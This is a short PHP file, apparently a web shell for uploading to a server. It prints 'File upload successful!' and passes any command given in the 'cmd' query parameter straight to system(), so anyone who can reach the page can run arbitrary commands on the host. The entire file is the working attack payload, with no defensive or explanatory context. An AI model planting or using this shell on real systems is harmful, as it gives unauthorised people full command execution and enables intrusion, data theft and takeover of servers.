<?php
echo "File upload successful! Pass commands using 'cmd' parameter as query.<br><br>";
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
